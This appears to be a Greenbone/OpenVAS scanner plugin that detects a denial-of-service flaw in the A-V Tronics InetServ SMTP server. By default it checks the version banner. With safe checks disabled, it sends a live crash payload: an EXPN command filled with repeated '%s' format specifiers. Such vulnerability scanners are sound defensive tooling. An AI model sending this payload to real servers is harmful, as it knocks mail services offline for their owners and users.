if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103040" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-01-24 13:11:38 +0100 (Mon, 24 Jan 2011)" );
	script_bugtraq_id( 45960 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "A-V Tronics InetServ SMTP Denial of Service Vulnerability" );
	script_category( ACT_MIXED_ATTACK );
	script_family( "SMTP problems" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "smtpserver_detect.sc" );
	script_require_ports( "Services/smtp", 25 );
	script_mandatory_keys( "smtp/inetserver/detected" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/45960" );
	script_tag( name: "summary", value: "InetServ is prone to a denial-of-service vulnerability." );
	script_tag( name: "impact", value: "Exploiting this issue may allow attackers to cause the application to
  crash, resulting in denial-of-service conditions." );
	script_tag( name: "affected", value: "Inetserv 3.23 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_banner" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("smtp_func.inc.sc");
require("version_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = smtp_get_port( default: 25 );
banner = smtp_get_banner( port: port );
if(!banner || !ContainsString( banner, "InetServer" )){
	exit( 0 );
}
if( safe_checks() ){
	version = eregmatch( pattern: "InetServer \\(([0-9.]+)\\)", string: banner );
	if(version[1]){
		if(version_is_equal( version: version[1], test_version: "3.2.3" )){
			report = report_fixed_ver( installed_version: version[1], fixed_version: "WillNotFix" );
			security_message( port: port, data: report );
			exit( 0 );
		}
		exit( 99 );
	}
	exit( 0 );
}
else {
	soc = smtp_open( port: port, data: smtp_get_helo_from_kb( port: port ) );
	if(!soc){
		exit( 0 );
	}
	ex = "EXPN " + crap( data: NASLString( "%s" ), length: 80 ) + NASLString( "\\r\\n" );
	send( socket: soc, data: ex );
	send( socket: soc, data: NASLString( "help\\r\\n" ) );
	if(!soc1 = smtp_open( port: port, data: NULL )){
		close( soc );
		security_message( port: port );
		exit( 0 );
	}
	smtp_close( socket: soc, check_data: FALSE );
	smtp_close( socket: soc1, check_data: FALSE );
	exit( 0 );
}

